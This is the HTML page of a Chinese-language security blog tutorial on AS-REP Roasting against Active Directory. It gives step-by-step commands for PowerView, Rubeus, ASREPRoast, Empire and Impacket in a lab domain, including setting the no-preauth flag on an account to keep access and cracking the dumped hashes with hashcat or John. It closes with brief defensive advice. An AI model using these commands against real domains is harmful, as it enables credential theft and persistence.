@@ -1,0 +1,658 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/ad_as_reproasting.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="域渗透-AS_REPRoasting - F0rmat&#39;s Blog">
+    <meta property="og:title" content="域渗透-AS_REPRoasting - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="域渗透-AS_REPRoasting - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。问题出现在身份预认证是kerberos认证的第">
+    <meta property="og:description" content="0x00 前言 这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。问题出现在身份预认证是kerberos认证的第">
+    <meta property="twitter:description" content="0x00 前言 这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。问题出现在身份预认证是kerberos认证的第">
+    <meta property="og:type" content="article">
+    <title>域渗透-AS_REPRoasting - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/ad_as_reproasting.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/ad_as_reproasting.html" title="域渗透-AS_REPRoasting">域渗透-AS_REPRoasting</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-02-22 00:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 22 Feb 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            3621 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            8 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-攻击原理">0x01 攻击原理</a>
+      <ul>
+        <li><a href="#利用原理">利用原理</a></li>
+        <li><a href="#利用思路">利用思路</a></li>
+        <li><a href="#与kerberoasting和黄金票据的区别">与Kerberoasting和黄金票据的区别</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-实战">0x02 实战</a>
+      <ul>
+        <li><a href="#powerview">PowerView</a></li>
+        <li><a href="#kerbrutepython">kerbrute（Python）</a></li>
+        <li><a href="#rubeus">Rubeus</a></li>
+        <li><a href="#asreproast">ASREPRoast</a></li>
+        <li><a href="#powershell-empire">Powershell Empire</a></li>
+        <li><a href="#getnpuserspy">GetNPUsers.py</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-防御建议">0x03 防御建议</a></li>
+    <li><a href="#0x04-参考">0x04 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>这是一种针对kerberos协议的攻击技术，不需要认证就可以获取到用户的密码hash值。问题出现在身份预认证是kerberos认证的第一步，通常是由KDC认证服务器来管理，目的是为了防止暴力破解攻击。</p>
+<p>相关的kerberos的详情可以查阅之前的一篇文章<a href="https://xxe.icu/posts/kerberos_authentication/">域渗透-Kerberos认证</a>，在实战当中比较少遇到，但是你要是在OSCP或者是HTB等平台可以遇到比较多这种漏洞的AD靶机。</p>
+<h1 id="0x01-攻击原理">0x01 攻击原理</h1>
+<h2 id="利用原理">利用原理</h2>
+<p>问题就是出现在如果用户开启了<code>不使用Kerberos预认证（Do not require Kerberos preauthentication）</code>，攻击者可以通过Kerberos AS-REP请求，获取到经过用户的hash加密过TGT票据，然后他就可以离线破解这个凭证了,但是该属性是默认不开启的。</p>
+<p>在AD用户管理的选项下可以看到，如下图：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/Domain-security/10.png" alt=""></p>
+<p>我们使用Wireshark抓包对比下是在哪里出的问题，我们先抓取不开启预验证的包：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/1.png" alt="1"></p>
+<p>下面是开启预验证的包：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/2.jpg" alt="2"></p>
+<p>我们可以看到是在pdata(pre-authentication data )项当中是多了<code>pA-ENC-TIMESTAMP</code>。</p>
+<p>该项是按照etype的加密类型，用用户hash加密时间戳，作为value 发送给AS服务器。然后AS服务器那边有用户hash，使用用户hash进行解密，获得时间戳，如果能解密，且时间戳在一定的范围内，则证明认证通过返回 TGT票据和enc_part（里面包含有session-key）。</p>
+<p>如果开启了不需要预验证，那么这项验证过程就不需要了，直接就能跳过获取到用户加密的TGT票据。</p>
+<p>我们看下返回的包：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/3.png" alt="3"></p>
+<p>向域控制器的88端口发送AS_REQ请求后，对收到的AS_REP内容(enc-part底下的ciper，因为这部分是使用用户hash加密session-key，我们通过进行离线爆破就可以获得用户hash)重新组合，能够拼接成”Kerberos 5 AS-REP etype 23”(18200)的格式，接下来可以使用hashcat对其破解，最终获得该用户的明文口令。</p>
+<blockquote>
+<p>注意不是ticket包中的enc-part，这个ticket用于TGS_REQ的认证。是加密的，用户不可读取里面的内容。在AS_REQ请求里面是使用krbtgt的hash进行加密的。</p>
+</blockquote>
+<p>点击鼠标右键获取AS_REP里面enc-part部分里面的ciper值，然后在前面加上<code>$krb5asrep$23$用户名@域名:</code>+ciper值的前32位字符+$+后面的字符，比如ciper值为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4440830848a2f2a1eabdd28222bceb2c24e5cd7cd311349609eed565f8c5c86803747e9bbc18e5b990400fbe62b554e8f33e6f7e2fb2e12499161705b95cd64b13a67e1f4bab841520fcd6935cd7c0ad25e5b8ee8ed91d7f247f5f8bf989971f9af645c3199978436ec962d254a95145a9414d8d9a48cb9a44f4815d13a204325d55399c2e4a175b7eaca33e47e79ad034b187574112010f0a4825614b74d4d2e671fd9bb546ff2987f4d3718735cdd0a3b3cbb52988bc900ebcbfb46a8320efc0ba04648c29e64ca587c342cf8bacab93d9aa4bb592cdde8c1b25733b1b57e0aee4168b597e303c68555d6518116cf6f294c726
+</span></span></code></pre></div><p>修改之后就成为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$krb5asrep$23$lucky@HACK.LAB:4440830848a2f2a1eabdd28222bceb2c$24e5cd7cd311349609eed565f8c5c86803747e9bbc18e5b990400fbe62b554e8f33e6f7e2fb2e12499161705b95cd64b13a67e1f4bab841520fcd6935cd7c0ad25e5b8ee8ed91d7f247f5f8bf989971f9af645c3199978436ec962d254a95145a9414d8d9a48cb9a44f4815d13a204325d55399c2e4a175b7eaca33e47e79ad034b187574112010f0a4825614b74d4d2e671fd9bb546ff2987f4d3718735cdd0a3b3cbb52988bc900ebcbfb46a8320efc0ba04648c29e64ca587c342cf8bacab93d9aa4bb592cdde8c1b25733b1b57e0aee4168b597e303c68555d6518116cf6f294c726
+</span></span></code></pre></div><p>把这串放到hashcat的18200模式破解就行了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> -a <span class="m">0</span> hash.txt passwordlist.txt
+</span></span></code></pre></div><p>尝试该工具会在日志中生成4678的TGT请求记录：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/9.png" alt="9"></p>
+<p>这里有没有同学思考过，如果关闭用户选项”Do not require Kerberos preauthentication”，我尝试使用正常的密码登录系统再抓包，其中的AS_REP包中的ciper值是否也能用hashcat解密呢？</p>
+<p>虽然感觉是在脱裤子放屁，但是你可以实践抓包看下，如果细心的同学就会发现，其实只要指定加密的类型为RC4_HMAC，一样是可以用hashcat解密的。</p>
+<p>平时我们登录的怎么指定加密类型呢，我们可以使用python写的一个项目：https://github.com/mubix/pykek</p>
+<p>使用下面的代码模拟发包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">user_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">RC4_HMAC</span><span class="p">,</span>  <span class="n">ntlm_hash</span><span class="p">(</span><span class="s2">&#34;p@ssw0rd&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span><span class="c1">#这里填写密码</span>
+</span></span><span class="line"><span class="cl"><span class="n">as_req</span><span class="o">=</span><span class="n">build_as_req</span><span class="p">(</span><span class="s2">&#34;hack.lab&#34;</span><span class="p">,</span> <span class="s2">&#34;lucky&#34;</span><span class="p">,</span> <span class="n">user_key</span><span class="p">,</span> <span class="n">time</span><span class="p">(),</span> <span class="n">getrandbits</span><span class="p">(</span><span class="mi">31</span><span class="p">),</span> <span class="n">pac_request</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sock</span> <span class="o">=</span> <span class="n">send_req</span><span class="p">(</span><span class="n">as_req</span><span class="p">,</span> <span class="s2">&#34;172.16.0.106&#34;</span><span class="p">)</span><span class="c1">#可以填写为dc主机名，比如dc.hack.lab</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">recv_rep</span><span class="p">(</span><span class="n">sock</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">as_rep</span> <span class="o">=</span> <span class="n">decrypt_as_rep</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">user_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">as_rep</span>
+</span></span></code></pre></div><p>破解的方法可以参考hashcat里面的，我也没弄懂，找时间看一下是怎么破解的：</p>
+<p><a href="https://github.com/hashcat/hashcat/blob/master/src/modules/module_18200.c">https://github.com/hashcat/hashcat/blob/master/src/modules/module_18200.c</a></p>
+<h2 id="利用思路">利用思路</h2>
+<p>那么在实战当中很少见会开启这个选项的，所以我们在内网渗透中一般是用来做权限维持。</p>
+<ul>
+<li>
+<p>需要枚举域内用户是否存在开启选项</p>
+<ol>
+<li>可以使用PowerView、kerbrute等工具枚举出存在开启选项”Do not require Kerberos preauthentication”的用户</li>
+<li>导出hash并破解</li>
+</ol>
+</li>
+<li>
+<p>需要先获得对指定用户的GenericWrite权限，利用思路如下：</p>
+<ol>
+<li>开启用户选项”Do not require Kerberos preauthentication”</li>
+<li>导出hash并破解</li>
+<li>关闭用户选项”Do not require Kerberos preauthentication”</li>
+</ol>
+</li>
+</ul>
+<h2 id="与kerberoasting和黄金票据的区别">与Kerberoasting和黄金票据的区别</h2>
+<p><strong>·</strong> AS-REP Roasting：获取用户hash然后离线暴力破解</p>
+<p><strong>·</strong> Kerberoasting：获取应用服务hash然后暴力破解</p>
+<p><strong>·</strong> 黄金票据：通过假冒域中不存在的用户来访问应用服务</p>
+<h1 id="0x02-实战">0x02 实战</h1>
+<p>下面是使用各种工具进行攻击的具体过程</p>
+<h2 id="powerview">PowerView</h2>
+<p>这款工具是集成在<code>PowerSploit</code>里面的，属于<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">Recon</a>系列，这款工具是由HarmJ0y大牛开发的。</p>
+<p>GitHub：https://github.com/PowerShellMafia/PowerSploit</p>
+<p>原理是使用LDAP查询满足条件(userAccountControl:1.2.840.113556.1.4.803:=4194304)的用户，DONT_REQ_PREAUTH项对应的值为4194304，可以参考官方的文档<a href="https://docs.microsoft.com/en-US/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">Use the UserAccountControl flags to manipulate user account properties</a></p>
+<p>假如我现在环境是在拿到了普通域用户testsql下执行PowerView脚本</p>
+<p>PowerView的命令如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Import-Module .\PowerView.ps1
+</span></span><span class="line"><span class="cl">Get-DomainUser -PreauthNotRequired -Verbose
+</span></span></code></pre></div><p>示例如下图:</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/4.png" alt="4"></p>
+<p>如果要有开启用户的<code>Do not require Kerberos preauthentication</code>选项需要拥有GenericWrite权限，这也就是我们上面所说的第二种利用方式。</p>
+<p>开启选项意味着对用户添加属性(userAccountControl=4194304)</p>
+<p>开启选项的命令如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Import-Module .\PowerView.ps1
+</span></span><span class="line"><span class="cl">Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
+</span></span></code></pre></div><p>关闭选项意味着删除用户属性(userAccountControl=4194304)</p>
+<blockquote>
+<p>这里可以再次进行异或运算，两次异或相当于不改变原数值，即删除用户属性(userAccountControl)</p>
+</blockquote>
+<p>关闭选项的命令如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Import-Module .\PowerView.ps1
+</span></span><span class="line"><span class="cl">Set-DomainObject -Identity testb -XOR @{userAccountControl=4194304} -Verbose
+</span></span></code></pre></div><h2 id="kerbrutepython">kerbrute（Python）</h2>
+<p>这款工具主要是来枚举域内存在开启<code>Do not require Kerberos preauthentication</code>选项的用户，在之前写的域用户枚举的一篇文章中写多，这里就不再展开，有兴趣的同学可以看下<a href="https://xxe.icu/posts/kerberos_user_enumerate/#kerbrutepython">域渗透-用户名枚举</a></p>
+<h2 id="rubeus">Rubeus</h2>
+<p>这款工具也是由HarmJ0y大牛开发的，是一个用于原始Kerberos互动和滥用的C＃工具集，功能还很多，这里就不一一介绍，主要是利用里面的AS-REP-Roasting的功能。</p>
+<p>现在GitHub上面不开放exe版本下载了，需要自己去生成，我们先去GitHub下面下载：</p>
+<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<p>解压后使用vs2019打开Rubeus.sln文件，点击生成-&gt;生成Rubeus即可，之后exe文件会生成在<code>Rubeus\bin\Debug</code>目录下。</p>
+<p>假如我现在环境是在拿到了普通域用户testsql下执行PowerView脚本,直接输入命令即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Rubeus.exe asreproast
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/5.png" alt="5"></p>
+<p>能枚举出域内存在该漏洞的用户的hash，默认输出的格式是John the Ripper (<a href="https://github.com/magnumripper/JohnTheRipper">Jumbo version</a>)，可以使用以下命令破解：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">John ./hash.txt –wordlist<span class="o">=</span>./password.txt
+</span></span></code></pre></div><p>也可以输出为hashcat的格式：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">format</span><span class="err">:</span><span class="n">hashcat</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">C:</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">hash</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><p>采用hashcat破解：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> -a <span class="m">0</span> hash.txt passwordlist.txt
+</span></span></code></pre></div><p>如果我们不在域用户下呢，比如说我们拿到了本地账户的机器跟DC(172.16.0.106)是相通的，我们也可以使用以下命令进行枚举：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">hack</span><span class="p">.</span><span class="py">lab</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">lucky</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="mf">172.16</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">106</span> <span class="p">/</span><span class="n">format</span><span class="err">:</span><span class="n">hashcat</span> <span class="p">/</span><span class="n">outfile</span><span class="err">:</span><span class="n">C:</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">hash</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><p>结果如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/6.png" alt="6"></p>
+<h2 id="asreproast">ASREPRoast</h2>
+<p>这款工具也是由HarmJ0y大牛开发的，不过推荐使用<a href="https://github.com/GhostPack/Rubeus">Rubeus</a> ，因为上面的功能很齐全，下面是利用的过程。</p>
+<p>在GitHub上进行下载：</p>
+<p><a href="https://github.com/HarmJ0y/ASREPRoast">https://github.com/HarmJ0y/ASREPRoast</a></p>
+<p>假如我现在环境是在拿到了普通域用户testsql下执行该脚本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">ASREPRoast</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-ASREPRoast</span>
+</span></span></code></pre></div><p>结果如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/7.png" alt="7"></p>
+<p>如果想要导出hash值进行破解可以执行下面的命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-ASREPRoast</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">Hash</span> <span class="p">&gt;</span> <span class="n">hash</span><span class="p">.</span><span class="py">txt</span>
+</span></span></code></pre></div><h2 id="powershell-empire">Powershell Empire</h2>
+<p>如果你喜欢使用Powershell Empire这个框架，并且想通过Empire这个框架发起ASREPRoast攻击，首先你得拿下一台机器，获得agent会话，然后运行下面这个模块来查看“PreauthNotRequired ”选项有没有勾选。</p>
+<p>使用以下的命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">usemodule situational_awareness/network/powerview/get_user
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/10.png" alt="10"></p>
+<p>该功能只能枚举出存在漏洞的用户，后续还是得使用Rubeus等工具进行导出hash值。</p>
+<h2 id="getnpuserspy">GetNPUsers.py</h2>
+<p>该工具是在<strong>Impacket</strong>中的，也默认安装在新版的kali。这个脚本是Impacket工具套件中的其中一个，它可以列举出哪些用户设置了“Do not require Kerberos pre-authentication”，并获得TGT票据。</p>
+<p>同样的，你也可以保存hash到文件中，然后利用John the ripper进行破解（默认是hashcat的格式），指定单用户：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 /usr/local/bin/GetNPUsers.py hack.lab/lucky -no-pass -dc-ip 172.16.0.106 -format john -outputfile hash.txt
+</span></span></code></pre></div><p>多用户：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 /usr/local/bin/GetNPUsers.py -no-pass -dc-ip 172.16.0.106 -usersfile users.txt -format john -outputfile hash.txt
+</span></span></code></pre></div><blockquote>
+<p>172.16.0.106是域控</p>
+</blockquote>
+<p>如下图所示：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_as_reproasting/8.png" alt="8"></p>
+<p>使用john破解：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john –wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span></code></pre></div><h1 id="0x03-防御建议">0x03 防御建议</h1>
+<p>1.确保域内不存在开启”Do not require Kerberos preauthentication”的用户</p>
+<p>扫描方法(使用PowerView)：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Import-Module .\PowerView.ps1
+</span></span><span class="line"><span class="cl">Get-DomainUser -PreauthNotRequired -Verbose
+</span></span></code></pre></div><p>2.域用户强制使用复杂口令，提高被字典和暴力破解的难度</p>
+<h1 id="0x04-参考">0x04 参考</h1>
+<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AS-REPRoasting</a></p>
+<p><a href="https://www.4hou.com/posts/ZpYE">https://www.4hou.com/posts/ZpYE</a></p>
+<p><a href="https://blog.csdn.net/shuteer_xu/article/details/106066628">https://blog.csdn.net/shuteer_xu/article/details/106066628</a></p>
+<p><a href="https://xxe.icu/posts/kerberos_authentication/">https://xxe.icu/posts/kerberos_authentication/</a></p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/ad_as_reproasting.html">https://xxe.icu/ad_as_reproasting.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/ad_pass_key.html" class="underline text-yellow-600">域渗透-哈希传递攻击(Pass The Hash/Key)</a></li>
+    
+    <li><a href="/kerberos_user_enumerate.html" class="underline text-yellow-600">域渗透-用户名枚举</a></li>
+    
+    <li><a href="/kerberos_authentication.html" class="underline text-yellow-600">域渗透-Kerberos认证</a></li>
+    
+    <li><a href="/responder_ntlmv2.html" class="underline text-yellow-600">使用Responder进行NTLM重放攻击</a></li>
+    
+    <li><a href="/llmnr_nbt-ns.html" class="underline text-yellow-600">LLMNR/NBT-NS欺骗攻击</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
